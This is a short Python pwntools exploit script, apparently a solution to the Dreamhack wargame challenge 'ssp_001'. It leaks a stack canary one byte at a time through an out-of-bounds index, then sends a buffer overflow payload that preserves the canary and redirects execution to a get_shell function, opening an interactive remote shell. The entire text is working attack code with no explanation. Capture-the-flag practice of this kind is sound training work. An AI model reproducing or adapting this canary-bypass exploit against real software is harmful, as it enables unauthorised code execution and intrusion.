from pwn import *

context.log_level = "debug"

p = remote("host3.dreamhack.games", 13716)
e = ELF("./ssp_001")
get_shell = e.symbols["get_shell"]

canary = b""
for i in range(0, 4):
    p.sendlineafter(b"> ", b"P")
    p.sendlineafter(b"Element index : ", str(131 - i))
    p.recvuntil(b"is : ")
    canary += p.recvn(2)
canary = int(canary, 16)
print(hex(canary))

payload = b"A" * 0x40 + p32(canary) + b"B" * 0x8 + p32(get_shell)
p.sendlineafter(b"> ", b"E")
p.sendlineafter(b"Name Size : ", str(1000))
p.sendafter(b"Name : ", payload)

p.interactive()
